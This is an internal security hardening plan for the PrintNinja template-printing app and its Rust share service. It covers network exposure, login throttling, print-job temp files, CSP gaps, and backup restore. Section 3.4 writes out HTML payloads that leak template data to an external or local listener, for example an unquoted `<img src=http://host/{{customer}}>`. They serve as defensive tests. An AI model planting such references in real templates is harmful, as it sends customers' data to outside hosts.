# Security Hardening Plan (Internal Use)

Status: **Proposed** (nothing in this document is implemented yet)
Branch reviewed: `v2`
Scope: the share service (`server/`), the way downloaded templates are printed
(`src-tauri/src/render`, `commands/print.rs`), and how the app talks to the service.

## 1. Context and decisions

PrintNinja is for **internal use** only. Users are employees, so the main risks are
mistakes, leaked customer data and anyone who can reach the server, not hostile
strangers.

Decisions already made:

| Topic | Decision |
|---|---|
| Server | Keep the Rust share service in `server/`. No server-less design. |
| Database | Local SQLite file on a Docker volume. No Turso or other remote database for now. |
| Deployment | Docker (`server/Dockerfile`, `docker-compose.yml`), steps in `docs/RELEASE.md` section 7. |
| Offline | The app keeps its local SQLite. Community browsing needs the network, saved copies print offline. |

Reasons to revisit the database choice: more than one server instance is needed, or
you want managed backups and high availability. The usual next step is managed
Postgres, which means porting the roughly 33 `rusqlite` call sites in `server/`.

## 2. How this was reviewed

Code reading only. Nothing was run or attacked, Docker was not available, and the
server could not be compiled during the review. Treat every finding as "to be
confirmed by a test" where this document says so.

Not reviewed: the local REST API (`src-tauri/src/api`), deep links, the Android
plugins, Tauri capabilities, and dependencies (no `cargo audit` or `pnpm audit` run).

## 3. Must fix

Do these before the service is used for real work. Each item has a way to prove it
is fixed.

### 3.1 Limit who can reach the server

Why: registration is open (`POST /v1/auth/register` needs no invitation), so anyone
who can connect can create an account. For an internal tool the network is the main
access control.

What to do:
- [ ] Expose the service only on the internal network or VPN (firewall or security
      group rule). The compose file already publishes the plain HTTP port on
      `127.0.0.1` only.
- [ ] If the Caddy profile is used, remember that ports 80 and 443 are published on
      all interfaces. Restrict them with the firewall too.
- [ ] For an internal host name, Let's Encrypt usually cannot issue a certificate
      because the name is not publicly reachable. Use `tls internal` in
      `server/Caddyfile` (and install Caddy's root certificate on the workstations),
      or put your own proxy and certificate in front.
- [ ] Optional second layer: an invite code checked in `register`, set through an
      environment variable.

Done when: from a machine outside the allowed network, `curl https://<host>/health`
fails, and from inside it returns `ok`.

### 3.2 Fix the login and registration throttle

Where: `server/src/main.rs` (`register`, `login`) and `Throttle` in `server/src/auth.rs`.

Problems:
- The client address comes from the `X-Forwarded-For` header, or the text `unknown`
  when the header is missing. Without a proxy, **all users share one bucket**: 5
  logins and 5 registrations per minute for the whole company.
- With a proxy, a header the client sends itself can be trusted by mistake.
- Every attempt is counted, including successful logins, and the handle key alone
  means anyone can lock a colleague out by sending 5 requests a minute for their
  handle.
- Keys are never removed, so the map grows slowly.

What to do:
- [ ] Take the client address from the connection (`ConnectInfo<SocketAddr>`), and
      use `X-Forwarded-For` only when the connection comes from your own proxy
      (configure its address, or take the last entry your proxy appended).
- [ ] Throttle on (handle, address) pairs, with a higher ceiling per handle alone.
- [ ] Count failed attempts, not successful ones.
- [ ] Remove idle keys (a periodic sweep, or a bounded cache).
- [ ] Add tests for each case above.

Done when: ten different users on one network can log in within a minute, and five
wrong passwords for one handle do not block that handle for other addresses.

### 3.3 Use a unique temporary file for every print job

Where: `PdfRenderer::html_to_pdf` in `src-tauri/src/render/mod.rs` always writes
`render.html` in the cache directory.

Problem: the queue only serializes jobs per printer. Two jobs on different printers
can overwrite each other's file, and one job can print another job's content, which
can mean the wrong customer's data on the wrong printer.

What to do:
- [ ] Write each job to a file named with a random id (for example a UUID) and
      delete it when the job ends, including on errors.
- [ ] Add a test that starts two jobs at once with different content and checks each
      output.

Done when: concurrent jobs each produce their own content and no `render-*.html`
files are left behind.

### 3.4 Block network access in the Rust print path

Where: the Content Security Policy is added only in the preview code
(`src/lib/render/renderTemplate.ts`). In the Rust path (`run_print` and
`apply_layout` in `src-tauri/src/commands/print.rs`, then `html_to_pdf`, which loads
the file in WebView2 on Windows) no CSP was found. Check which path the Print page,
batch, REST API and deep links actually use.

Why it matters even internally: a template copied from a colleague or from outside
may contain an external image or stylesheet. When it is printed, the template data
(names, prices) could be sent to that address, for example through
`<img src=http://host/{{customer}}>`. The remote-reference check is a list of exact
strings (`find_remote_refs` in `render/handlebars.rs`, and a shorter one in the
server's `put_template`), so forms like an unquoted `src=http://...` are not caught.
`sanitize_html` is a hand-written string stripper.

What to do:
- [ ] Insert the same CSP as the preview (`default-src 'none'; img-src data:;
      style-src 'unsafe-inline'; font-src data:`) into the HTML in the Rust path.
      Keep the policy string in one place used by both Rust and TypeScript.
- [ ] Replace the string checks with a parser-based sanitizer (for example the
      `ammonia` crate, configured to allow only what templates need).
- [ ] Make the server's check at least as strict as the app's, or run the same code.

Test (do this first, before changing anything, to learn if the problem is real):
- [ ] Start a listener (`python3 -m http.server 8099`).
- [ ] Create a template containing `<img src=http://127.0.0.1:8099/x?{{name}}>`
      (unquoted), and also variants with `<link rel=stylesheet href=...>` and
      `<meta http-equiv=refresh content="0;url=http://127.0.0.1:8099">`.
- [ ] Print it on Windows with sample data. Any request in the listener's log means
      the leak is real.
- [ ] Repeat after the fix: no requests should arrive.

Done when: all variants print without any network request.

### 3.5 Test a backup and a restore

Where: the backup steps are in `docs/RELEASE.md` section 7. There is no restore step.

- [ ] Run the backup, then restore it on a test host and check that you can log in
      and list templates.
- [ ] Add the restore steps to `RELEASE.md`. A draft:

```bash
docker compose stop printninja-server
docker run --rm -v printninja_printninja-data:/data -v "$PWD":/backup busybox sh -c \
  'cp /backup/printninja-YYYY-MM-DD.db /data/printninja-server.db && chown 10001:10001 /data/printninja-server.db'
docker compose start printninja-server
```

The `chown` matters: the server runs as user 10001, and a file copied by root cannot
be written by it.

Done when: a restore on a clean volume brings back accounts and templates.

## 4. Can wait (do when convenient)

| Item | Notes |
|---|---|
| Password reset | There is no reset or change endpoint. A forgotten password locks the account. Deleting the user row is **not** a fix: foreign keys cascade and remove their published templates and sessions. Add an admin command (for example `printninja-server reset-password <handle>`), or move to company single sign-on later. This is the most likely day-to-day problem. |
| Use counter | Any signed-in user can call `/use` repeatedly, which distorts "Most used". Count each user once per template. |
| Limits | No cap on templates per user, and `name` and `summary` are limited only by the framework's request size (about 2 MB). Add caps. |
| Handles | `is_alphanumeric()` accepts any Unicode letter, so look-alike handles are possible. Restrict to ASCII. |
| Removing content | No admin way to remove a template except editing the database. Add a command or endpoint. |
| Session token storage | The token is kept in the local SQLite settings table, not the system keyring. |
| HTTPS in the app | The app accepts an `http://` service address. Reject it except for localhost. Less urgent on a private network, but passwords and tokens travel in clear text over plain HTTP. |
| First-print warning | Show "from @handle, review before printing" the first time a downloaded template is printed. |
| CI | CI builds only `src-tauri`. Add a job for `server/` and the Docker image, and run `cargo audit` and `pnpm audit`. |
| Expired sessions | Check that old rows are deleted from `sessions`. |
| Account deletion | Add self-service deletion if company policy requires it. |

## 5. If it ever goes beyond internal use

Everything in section 4 moves up to "must fix", and add: rate limits on publish and
save, moderation and reporting, a real invitation or approval flow for registration,
and a fresh review. The current design assumes people who are trusted not to publish
hostile templates.

## 6. Suggested order of work

1. Run the print-path test in 3.4 (about an hour, and it tells you how serious that item is).
2. Fix 3.3 and 3.4 together (both are in the Rust print code).
3. Fix 3.2 (server).
4. Settle 3.1 and 3.5 during deployment.
5. Pick items from section 4, starting with password reset.

## 7. Open questions

- Which hosting environment and network will the server run in, and is there a VPN?
- Is HTTPS terminated by an existing company proxy, or by Caddy in the compose file?
- Is company single sign-on (SSO) planned? It would replace the account and password code.
- Who is the administrator who will reset passwords and remove templates?
